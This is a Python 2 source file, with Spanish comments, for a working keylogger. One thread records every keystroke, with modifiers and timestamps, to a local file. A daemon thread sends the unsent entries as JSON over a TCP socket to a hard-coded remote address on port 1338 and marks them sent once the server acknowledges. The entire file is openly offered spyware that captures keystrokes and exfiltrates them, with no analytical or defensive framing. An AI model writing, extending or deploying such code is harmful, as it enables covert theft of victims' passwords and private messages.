from keylogger import log
import time
import threading
import json
import socket

class Keylogger(threading.Thread):
    
    def __init__(self,files,maxTime=60,**kw):
        threading.Thread.__init__(self,**kw)
        self.maxTime = maxTime
        self.files = files

    def run(self):
        now = time.time()
        done = lambda: time.time() > now + self.maxTime*60
        log(done,self._save_key);

    def _save_key(self,t,modifiers,key):
        tmpDict = {
            'time':t,
            'modifiers':modifiers,
            'key':key,
            'send':False
        }
        self.files.lock.acquire()
        self.files.fileW.write(json.dumps(tmpDict)+',')
        self.files.fileW.flush()
        self.files.lock.release()
       
class Daemon(threading.Thread):
    def __init__(self,files,ip=False,port=False,timeSleep=5,**kw):
        self.ip = ip
        self.port = port
        self.timeSleep = timeSleep
        self.files = files
        self.make_cliente()
        threading.Thread.__init__(self,**kw)

    def run(self):
        while True:
            time.sleep(self.timeSleep)
            #print "leeeeeeeee_____________"
	    print '.'

            self.files.lock.acquire()
            self.files.fileR.seek(0)
            read = self.files.fileR.read()
            infoKeys = json.loads('['+read[:-1]+']')

            toSend = []
            for i in infoKeys:
                if i.get('send',True) == False:
                    toSend.append(i) 
                    i['send'] = True
            
            save = read
            if self._send_data(toSend):
                save = read.replace('false','true')
                self.files.fileW.seek(0)
                self.files.fileW.truncate()
                self.files.fileW.write(save)
                self.files.fileW.flush()      
            else:
                pass
                #como esta

            self.files.lock.release()

    def make_cliente(self):
        socket_client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            socket_client.connect((self.ip,1338))
        except:
            pass#no online

        self.socket_client = socket_client

    def _send_data(self,keys):
        #si lo envio!
        res = False
        try:
            self.socket_client.sendall(json.dumps(keys))
            res = self.socket_client.recv(1000)
        except:
            self.make_cliente()#try reconect

        if res == 'OK':
            print "ENVIADO BIEN"
            return True
        else:
            print "res",res
        return False

    def close_socket(self):
        self.socket_client.close()

class FileWR(object):
    
    def __init__(self,fileW,fileR,lock):
        self.fileW = fileW
        self.fileR = fileR
        self.lock = lock

if __name__ == '__main__':

    lock = threading.Lock()
    fileKeys = open('keysLogs.txt','w+')
    fileKeysRead = open('keysLogs.txt','rt')
    
    f = FileWR(fileKeys,fileKeysRead,lock)

    daemon = Daemon(f,'192.168.43.105')
    daemon.start()

    ky = Keylogger(f)
    ky.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print "stop all"
        daemon.close_socket()
        for thread in threading.enumerate():
            if thread.isAlive():
                try:
                    thread._Thread__stop()
                except:
                    print 'No se pudo matar todos los threads'
        
        fileKeys.close()
        fileKeysRead.close()
        exit(0)
